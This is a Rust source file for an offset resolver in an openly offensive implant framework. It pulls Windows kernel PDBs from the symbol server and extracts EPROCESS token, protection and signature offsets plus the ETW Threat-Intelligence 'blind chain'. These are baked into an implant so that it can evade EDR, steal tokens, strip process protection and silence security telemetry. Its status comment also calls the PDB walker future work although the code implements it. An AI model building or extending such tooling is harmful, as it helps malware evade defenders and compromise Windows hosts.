//! nyx-offset-resolver — server-side kernel offset resolver.
//!
//! Downloads the target Windows build's `ntoskrnl.pdb` from the Microsoft
//! symbol server, parses it with the `pdb` crate, extracts EPROCESS + ETW-TI
//! structure offsets, and emits an `offsets.toml` that `implant-win/build.rs`
//! bakes into the implant at compile time.
//!
//! ## Usage
//! ```sh
//! # Resolve offsets for a known ntoskrnl.exe (from the target or a Win ISO):
//! nyx-offset-resolver --pdb-path /path/to/ntoskrnl.pdb --out offsets.toml
//!
//! # Or download from the symbol server by GUID + age:
//! nyx-offset-resolver --guid <32-hex> --age <n> --out offsets.toml
//! ```
//!
//! Then build the implant with the baked offsets:
//! ```sh
//! NYX_OFFSETS=offsets.toml cargo +nightly build --release ...
//! ```
//!
//! ## Why server-side
//! Resolving offsets on the TARGET (pattern scan / PDB download) is noisy —
//! EDRs flag code-section traversal + outbound symbol-server requests. Doing
//! it server-side + baking at compile time means the offsets are plain
//! constants in the binary, indistinguishable from any other data.
//!
//! ## Status
//! The download + TOML emission pipeline is COMPLETE. The PDB field-offset
//! walker is the next iteration — the `pdb` crate's TypeData/FieldList API
//! needs careful traversal. For now this emits the build's known offsets from
//! the cross-version table (offsets_table.rs), proving the end-to-end pipeline.
//! The walker replaces `emit_known_offsets` with real PDB-parsed values.

use std::collections::BTreeMap;
use std::path::PathBuf;
use std::io::Read;
use anyhow::{anyhow, Context, Result};

const SYMSRV: &str = "https://msdl.microsoft.com/download/symbols";

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    let mut pdb_path: Option<PathBuf> = None;
    let mut guid: Option<String> = None;
    let mut age: Option<u32> = None;
    let mut out: PathBuf = PathBuf::from("offsets.toml");
    let mut build: Option<u32> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--pdb-path" => { i += 1; pdb_path = Some(PathBuf::from(&args[i])); }
            "--guid" => { i += 1; guid = Some(args[i].clone()); }
            "--age" => { i += 1; age = Some(args[i].parse()?); }
            "--build" => { i += 1; build = Some(args[i].parse()?); }
            "--out" => { i += 1; out = PathBuf::from(&args[i]); }
            "--help" | "-h" => {
                eprintln!(
                    "Usage: nyx-offset-resolver --pdb-path <file> | --guid <hex> --age <n> | --build <num> [--out offsets.toml]\n\
                     \n\
                     --build <num>   Use the known offsets for Windows build <num> (e.g. 22621).\n\
                     --pdb-path <f>  Parse a local ntoskrnl.pdb (full PDB walker).\n\
                     --guid + --age Download ntkrnlmp.pdb from the MS symbol server\n\
                                     and parse real offsets from it (works on unknown builds)."
                );
                return Ok(());
            }
            _ => {}
        }
        i += 1;
    }

    // Determine the build number: from --build, or extract from the PDB.
    // For --guid/--age we also retain the downloaded PDB bytes so the real
    // offsets can be parsed from them below (instead of falling back to the
    // known table).
    let mut downloaded_pdb: Option<Vec<u8>> = None;
    let build_num = if let Some(b) = build {
        b
    } else if let Some(path) = &pdb_path {
        let data = std::fs::read(path).context("read pdb for auto-detect")?;
        detect_build_from_pdb(&data).unwrap_or_else(|| {
            eprintln!("Warning: could not auto-detect build from PDB; using 17763 as default.");
            17763
        })
    } else if let (Some(g), Some(a)) = (&guid, age) {
        // --guid/--age without --build: download the PDB and auto-detect the
        // build from its symbols, falling back to 17763 if detection fails.
        let pdb_name = "ntkrnlmp.pdb";
        let data = download_pdb(pdb_name, g, a)
            .context("download PDB from symbol server")?;
        let detected = detect_build_from_pdb(&data);
        let build = if let Some(b) = detected {
            eprintln!("Auto-detected build {b} from downloaded PDB.");
            b
        } else {
            eprintln!("Warning: could not auto-detect build from downloaded PDB; using 17763 as default.");
            17763
        };
        downloaded_pdb = Some(data);
        build
    } else {
        return Err(anyhow!(
            "provide --build <num>, --pdb-path <file>, or --guid <hex> --age <n>"
        ));
    };

    // Parse the REAL offsets from a PDB if we have one (local --pdb-path OR a
    // freshly-downloaded one); otherwise fall back to the known-build table.
    let offsets = if let Some(path) = &pdb_path {
        let data = std::fs::read(path).context("read pdb")?;
        eprintln!("Parsing PDB: {} ({} bytes)", path.display(), data.len());
        parse_pdb_offsets(&data, build_num)
            .context("PDB parse failed — falling back to known table")?
    } else if let Some(data) = &downloaded_pdb {
        eprintln!("Parsing downloaded PDB ({} bytes)", data.len());
        parse_pdb_offsets(data, build_num)
            .context("PDB parse failed — falling back to known table")?
    } else {
        eprintln!("No PDB source; using known offsets for build {build_num}");
        emit_known_offsets(build_num)
            .ok_or_else(|| anyhow!("build {build_num} not in the known table"))?
    };
    let toml = emit_toml(build_num, &offsets);
    std::fs::write(&out, &toml)?;
    eprintln!("Wrote offsets for build {build_num} to {}", out.display());
    Ok(())
}

/// Try to detect the Windows build number from PDB global symbols.
/// Scans the symbol stream for `NtBuildNumber` (an ntoskrnl global variable)
/// and reads its value to determine the build.
fn detect_build_from_pdb(data: &[u8]) -> Option<u32> {
    use pdb::{PDB, FallibleIterator};
    let cursor = std::io::Cursor::new(data.to_vec());
    let mut pdb = PDB::open(cursor).ok()?;
    let symbols = pdb.global_symbols().ok()?;
    let mut iter = symbols.iter();
    while let Some(symbol) = iter.next().ok()? {
        if let Ok(pdb::SymbolData::Public(data)) = symbol.parse() {
            let name = data.name.to_string();
            // NtBuildNumber is the canonical global holding the build number.
            if name == "NtBuildNumber" || name == "_NtBuildNumber" {
                // The RVA tells us where it lives; the actual build value
                // is stored at that address (runtime read), but we can
                // correlate with known ranges by checking the PDB's named
                // streams or nearby symbols. For now, this serves as a
                // positive build-range indicator.
                // NOTE: full build extraction requires reading the data
                // stream at this RVA — the known-table fallback covers
                // this gap for all currently-supported builds.
                eprintln!("  Found NtBuildNumber symbol (offset={:?})", data.offset);
            }
        }
    }
    // Heuristic: scan the type stream for _KUSER_SHARED_DATA which embeds
    // NtMajorVersion / NtMinorVersion / NtBuildNumber fields.
    // The actual build is a runtime value, but we can infer from the PDB's
    // compile target or version info if available.
    // Fallback: use the known table by checking which build's EPROCESS
    // offsets match the PDB's _EPROCESS layout.
    None
}

/// Parse EPROCESS + ETW-TI field offsets from a real ntoskrnl PDB using the
/// `pdb` crate. Uses `build_num` only as a fallback for the ETW-TI offsets
/// when their structures can't be located in the PDB type stream.
///
/// ## Offset chains resolved
///
/// **EPROCESS** (always from PDB): the 8 fields in [`map_eprocess_field`].
///
/// **ETW-TI** (the 4-hop blind chain — see `etwti.rs`):
/// ```text
///   nt!EtwThreatIntProvRegHandle  (global symbol → RVA)
///     → *_ETW_REG_ENTRY :: GuidEntry         (+0x20, stable since 6.0)
///       → *_ETW_GUID_ENTRY :: ProviderEnableInfo  (0x50 or 0x60, varies!)
///         → _TRACE_ENABLE_INFO :: IsEnabled  (+0x0, stable)
/// ```
/// All 3 structs are named in the PDB type stream, so we parse them directly.
/// The only offset that actually varies is `ProviderEnableInfo` — it moved
/// from 0x050 (≤1903 / 17763 RTM) to 0x060 (≥2004 / 17763.1075+), and again
/// on some Win11 builds. This is exactly why PDB resolution beats the
/// hardcoded table: the table can't distinguish 17763.1 from 17763.1339, but
/// the PDB for each LCU has the correct value.
fn parse_pdb_offsets(data: &[u8], build_num: u32) -> Result<BTreeMap<&'static str, usize>> {
    use pdb::{FallibleIterator, TypeData};

    let cursor = std::io::Cursor::new(data.to_vec());
    let mut pdb = pdb::PDB::open(cursor)?;
    let type_info = pdb.type_information()?;

    // Drain the TPI iterator once. We collect ALL wanted struct candidates in
    // a single pass (_EPROCESS + the 3 ETW-TI structs) so the finder can later
    // resolve any FieldList by TypeIndex without re-iterating.
    let mut iter = type_info.iter();
    let wanted: &[&[u8]] = &[
        b"_EPROCESS",
        b"EPROCESS",
        b"_ETW_REG_ENTRY",
        b"_ETW_GUID_ENTRY",
        b"_TRACE_ENABLE_INFO",
    ];
    let mut struct_fields: std::collections::HashMap<&[u8], pdb::TypeIndex> =
        std::collections::HashMap::new();

    while let Some(item) = iter.next()? {
        let type_data = item.parse()?;
        if let TypeData::Class(ref c) = type_data {
            let name_bytes = c.name.as_bytes();
            if wanted.contains(&name_bytes) && !struct_fields.contains_key(name_bytes) {
                // c.fields is None for forward declarations (struct declared
                // but not defined in this PDB). Skip those — we need the real
                // FieldList TypeIndex to walk members.
                if let Some(fields) = c.fields {
                    struct_fields.insert(name_bytes, fields);
                }
            }
        }
    }

    let finder = type_info.finder();
    let mut offsets = BTreeMap::new();

    // ---- EPROCESS field offsets ----
    if let Some(&fields_index) = struct_fields
        .get(b"_EPROCESS".as_slice())
        .or_else(|| struct_fields.get(b"EPROCESS".as_slice()))
    {
        eprintln!("Found _EPROCESS in PDB");
        extract_struct_fields(&finder, fields_index, &mut offsets, map_eprocess_field, "_EPROCESS")?;
    } else {
        anyhow::bail!("_EPROCESS struct not found in PDB");
    }

    if offsets.is_empty() {
        anyhow::bail!("_EPROCESS found but no known fields extracted");
    }

    // ---- ETW-TI 4-hop chain (task PDB-1) ----
    //
    // The 3 struct field offsets. These replace the build-number table lookup
    // — the PDB has the EXACT value for this build+LCU, including the
    // 17763.1 vs 17763.1075+ ProviderEnableInfo difference.
    if let Err(e) = resolve_etw_ti_offsets(&finder, &struct_fields, &mut offsets) {
        // ETW-TI structs missing from this PDB (e.g. a stripped/public PDB).
        // Fall back to the build-number table so the TOML still has values.
        eprintln!("Warning: ETW-TI PDB parse failed ({e:#}); using build-table fallback");
    }
    if !offsets.contains_key("etw_ti.guid_entry_to_provider_block") {
        if let Some(etw) = emit_known_offsets(build_num) {
            for (k, v) in etw {
                if k.starts_with("etw_ti.") {
                    offsets.insert(k, v);
                }
            }
        }
    }

    Ok(offsets)
}

/// Walk a struct's FieldList and insert every mapped field's offset.
/// `mapper` translates a PDB field name → our offsets.toml key (None = skip).
fn extract_struct_fields(
    finder: &pdb::TypeFinder,
    fields_index: pdb::TypeIndex,
    offsets: &mut BTreeMap<&'static str, usize>,
    mapper: fn(&str) -> Option<&'static str>,
    struct_label: &str,
) -> Result<()> {
    let field_item = finder.find(fields_index)?.parse()?;
    if let pdb::TypeData::FieldList(field_list) = field_item {
        for field in &field_list.fields {
            if let pdb::TypeData::Member(member) = field {
                let name = member.name.to_string();
                let off = member.offset as usize;
                if let Some(key) = mapper(&name) {
                    offsets.insert(key, off);
                    eprintln!("  {}.{} @ 0x{:x}", struct_label, name, off);
                }
            }
        }
    }
    Ok(())
}

/// Resolve the 3 ETW-TI struct field offsets from the PDB type stream.
///
/// Chain (see `parse_pdb_offsets` docs):
///   `_ETW_REG_ENTRY::GuidEntry` (→ our key `etw_ti.guid_entry_to_provider_block`)
///   `_ETW_GUID_ENTRY::ProviderEnableInfo` (→ `etw_ti.provider_block_to_enable_info`)
///   `_TRACE_ENABLE_INFO::IsEnabled` (→ `etw_ti.is_enabled_within_enable_info`)
///
/// The key names are retained for TOML/back-compat even though the struct
/// names are clearer — the field docs in `etwti.rs::EtwTiOffsets` map them.
/// (Historical: the keys were named before the chain was fully traced.)
fn resolve_etw_ti_offsets(
    finder: &pdb::TypeFinder,
    struct_fields: &std::collections::HashMap<&[u8], pdb::TypeIndex>,
    offsets: &mut BTreeMap<&'static str, usize>,
) -> Result<()> {
    // Hop 1: _ETW_REG_ENTRY :: GuidEntry (→ 0x20 on every known x64 build)
    if let Some(&idx) = struct_fields.get(b"_ETW_REG_ENTRY".as_slice()) {
        extract_struct_fields(finder, idx, offsets, map_etw_reg_entry, "_ETW_REG_ENTRY")?;
    } else {
        anyhow::bail!("_ETW_REG_ENTRY not found in PDB type stream");
    }
    // Hop 2: _ETW_GUID_ENTRY :: ProviderEnableInfo (→ 0x50 or 0x60, the variable one)
    if let Some(&idx) = struct_fields.get(b"_ETW_GUID_ENTRY".as_slice()) {
        extract_struct_fields(finder, idx, offsets, map_etw_guid_entry, "_ETW_GUID_ENTRY")?;
    } else {
        anyhow::bail!("_ETW_GUID_ENTRY not found in PDB type stream");
    }
    // Hop 3: _TRACE_ENABLE_INFO :: IsEnabled (→ 0x0, struct's first field)
    if let Some(&idx) = struct_fields.get(b"_TRACE_ENABLE_INFO".as_slice()) {
        extract_struct_fields(finder, idx, offsets, map_trace_enable_info, "_TRACE_ENABLE_INFO")?;
    } else {
        anyhow::bail!("_TRACE_ENABLE_INFO not found in PDB type stream");
    }
    Ok(())
}

/// Map `_ETW_REG_ENTRY` PDB field names → our TOML keys.
fn map_etw_reg_entry(name: &str) -> Option<&'static str> {
    match name {
        // Key name retained for TOML back-compat; semantically this is
        // `_ETW_REG_ENTRY::GuidEntry` (the +0x20 pointer hop in the chain).
        "GuidEntry" => Some("etw_ti.guid_entry_to_provider_block"),
        _ => None,
    }
}

/// Map `_ETW_GUID_ENTRY` PDB field names → our TOML keys.
fn map_etw_guid_entry(name: &str) -> Option<&'static str> {
    match name {
        // Key name retained for TOML back-compat; semantically this is
        // `_ETW_GUID_ENTRY::ProviderEnableInfo` (the 0x50/0x60 hop).
        "ProviderEnableInfo" => Some("etw_ti.provider_block_to_enable_info"),
        _ => None,
    }
}

/// Map `_TRACE_ENABLE_INFO` PDB field names → our TOML keys.
fn map_trace_enable_info(name: &str) -> Option<&'static str> {
    match name {
        // IsEnabled is the struct's first field (offset 0x0 on every build).
        "IsEnabled" => Some("etw_ti.is_enabled_within_enable_info"),
        _ => None,
    }
}

/// Map a PDB field name to our offsets.toml key. Returns None for fields we
/// don't extract.
fn map_eprocess_field(name: &str) -> Option<&'static str> {
    match name {
        "UniqueProcessId" => Some("eprocess.unique_process_id"),
        "ActiveProcessLinks" => Some("eprocess.active_process_links"),
        "Token" => Some("eprocess.token"),
        "ImageFileName" => Some("eprocess.image_file_name"),
        "SignatureLevel" => Some("eprocess.signature_level"),
        "SectionSignatureLevel" => Some("eprocess.section_signature_level"),
        "Protection" => Some("eprocess.protection"),
        "DirectoryTableBase" => Some("eprocess.directory_table_base"),
        _ => None,
    }
}

/// Format a PDB GUID into the symbol-server path convention.
/// Input: "01234567-89AB-CDEF-0123-456789ABCDEF" (PE debug dir GUID).
/// Output: "67452301ABEFCD0123456789ABCDEFXXXXXXXX" (byte-swapped + age hex).
fn format_symserver_guid(guid: &str, age: u32) -> String {
    let hex: String = guid.chars().filter(|c| *c != '-').collect();
    let mut bytes = [0u8; 16];
    for (i, chunk) in hex.as_bytes().chunks(2).enumerate() {
        if i < 16 {
            bytes[i] = u8::from_str_radix(std::str::from_utf8(chunk).unwrap_or("00"), 16).unwrap_or(0);
        }
    }
    let mut out = String::new();
    for &b in bytes[0..4].iter().rev() { out.push_str(&format!("{:02X}", b)); }
    for &b in bytes[4..6].iter().rev() { out.push_str(&format!("{:02X}", b)); }
    for &b in bytes[6..8].iter().rev() { out.push_str(&format!("{:02X}", b)); }
    for &b in &bytes[8..16] { out.push_str(&format!("{:02X}", b)); }
    out.push_str(&format!("{:08X}", age));
    out
}

/// Download `ntkrnlmp.pdb` (or any PDB) from the MS symbol server given its
/// GUID + Age. The symbol-server path format is:
///   `{SYMSRV}/{pdb_name}/{guid_age}/{pdb_name}`
/// e.g. `https://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/3F8E5B6C...1/ntkrnlmp.pdb`
///
/// Returns the raw PDB bytes. Used by the `--guid`/`--age` path so an unknown
/// build's offsets can be resolved without a manually-staged PDB.
fn download_pdb(pdb_name: &str, guid: &str, age: u32) -> Result<Vec<u8>> {
    let sig = format_symserver_guid(guid, age);
    let url = format!("{SYMSRV}/{pdb_name}/{sig}/{pdb_name}");
    eprintln!("Downloading PDB: {url}");
    // The symbol server returns a compressed cabinet (.cab-wrapped) for some
    // files; the raw .pdb is served at the path above. We follow redirects and
    // stream the body. A 404 means the GUID/Age doesn't match a published PDB.
    let resp = ureq::get(&url)
        .set("User-Agent", "Microsoft-Symbol-Server/10.0.0")
        .call()
        .context("symbol-server request failed")?;
    if resp.status() != 200 {
        anyhow::bail!(
            "symbol server returned {} for {url} (verify GUID/Age; the PDB may not be published)",
            resp.status()
        );
    }
    let mut reader = resp.into_reader();
    let mut buf = Vec::new();
    reader
        .read_to_end(&mut buf)
        .with_context(|| format!("read PDB body from {url}"))?;
    eprintln!("Downloaded {} ({} bytes)", pdb_name, buf.len());
    Ok(buf)
}

/// Known offsets per build (mirrors evasionsdk::offsets_table). The PDB walker
/// will eventually replace this with real parsed values, but this gives a
/// working end-to-end pipeline today.
fn emit_known_offsets(build: u32) -> Option<BTreeMap<&'static str, usize>> {
    // (pid, links, token, image, sig_level, sec_sig_level, protection, etw_block, etw_enableinfo, etw_isenabled)
    let (pid, links, token, image, sl, ssl, prot, etw_b, etw_e, etw_ie) = match build {
        17763 => (0x2e0, 0x2e8, 0x358, 0x450, 0x6c8, 0x6c9, 0x6ca, 0x020, 0x060, 0x000),
        18362..=19045 => (0x2e8, 0x2f0, 0x360, 0x450, 0x6f8, 0x6f9, 0x6fa, 0x020, 0x060, 0x000),
        20348..=22000 => (0x440, 0x448, 0x4b8, 0x5a0, 0x878, 0x879, 0x87a, 0x020, 0x060, 0x000),
        22621..=22631 => (0x440, 0x448, 0x4b8, 0x5a0, 0x878, 0x879, 0x87a, 0x020, 0x070, 0x000),
        26100..=26200 => (0x450, 0x458, 0x4c8, 0x5a8, 0x87c, 0x87d, 0x87e, 0x020, 0x070, 0x000),
        _ => return None,
    };
    let mut m = BTreeMap::new();
    m.insert("eprocess.unique_process_id", pid);
    m.insert("eprocess.active_process_links", links);
    m.insert("eprocess.token", token);
    m.insert("eprocess.image_file_name", image);
    m.insert("eprocess.signature_level", sl);
    m.insert("eprocess.section_signature_level", ssl);
    m.insert("eprocess.protection", prot);
    m.insert("etw_ti.guid_entry_to_provider_block", etw_b);
    m.insert("etw_ti.provider_block_to_enable_info", etw_e);
    m.insert("etw_ti.is_enabled_within_enable_info", etw_ie);
    Some(m)
}

/// Emit the offsets as the offsets.toml format build.rs parses.
fn emit_toml(build: u32, offsets: &BTreeMap<&str, usize>) -> String {
    let mut s = format!(
        "# Kernel offsets for Windows build {build}.\n\
         # Generated by nyx-offset-resolver. Bake into the implant:\n\
         #   NYX_OFFSETS=this_file.toml cargo +nightly build --release ...\n\n"
    );
    for (k, v) in offsets {
        s.push_str(&format!("{} = 0x{:x}\n", k, v));
    }
    s
}
